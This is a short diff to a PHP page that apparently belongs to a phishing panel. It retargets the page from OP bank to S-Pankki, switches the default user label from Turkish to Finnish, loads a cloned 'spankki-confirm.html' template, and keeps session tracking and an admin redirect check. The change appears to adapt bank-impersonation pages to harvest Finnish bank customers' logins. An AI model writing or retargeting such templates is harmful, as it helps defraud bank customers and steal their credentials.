@@ -1,8 +1,8 @@
 <?php
 ob_start();
-$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
-$bankName = htmlspecialchars($bank['name'] ?? 'OP');
-$htmlContent = file_get_contents(__DIR__ . '/opbank.html');
+$userName = htmlspecialchars($user['full_name'] ?? 'Käyttäjä');
+$bankName = htmlspecialchars($bank['name'] ?? 'S-Pankki');
+$htmlContent = file_get_contents(__DIR__ . '/spankki-confirm.html');
 
 $userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);
 
@@ -36,9 +36,6 @@ if ($userId > 0) {
                 })
                 .catch(() => {});
         }
-        
-        // opbank.html handler will be used, no form handler here
-        // Form handler is defined in opbank.html
         
         updateCurrentPage();
         checkAdminRedirect();
